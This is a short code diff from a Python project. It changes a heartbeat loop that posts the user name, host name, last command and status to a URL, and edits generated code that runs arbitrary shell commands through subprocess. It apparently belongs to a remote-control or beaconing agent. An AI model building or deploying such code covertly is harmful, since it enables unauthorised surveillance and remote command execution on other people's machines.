@@ -231,7 +231,7 @@ class JarvisUtils():
 					data[:] = []
 					data.append({'id' : id , 'user' : GetUsername() , 'host' : GetHostname() , 'command' : GetLastCommand() , 'time' : localTime , 'status' : 'alive'})
 					requests.post(url, data=json.dumps(data), headers=headers)
-					time.sleep(1.0)
+					time.sleep(2.0)
 				
 				data[:] = []
 				localTime = datetime.datetime.now().strftime("%Y%m%d_%H%M%S%f")
@@ -581,7 +581,7 @@ class Commands():
 				_command = _command + "\n"
 				_command = _command + "def Run(command, parameters=None):\n"
 				_command = _command + "\tif(parameters != None):\n"
-				_command = _command + "\t\tsubprocess.Popen([command, parameters], shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)\n"
+				_command = _command + "\t\tproc = subprocess.Popen([command, parameters], shell=True)\n"
 				_command = _command + "\telse:\n"
 				_command = _command + "\t\tproc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n"
 				_command = _command + "\n"
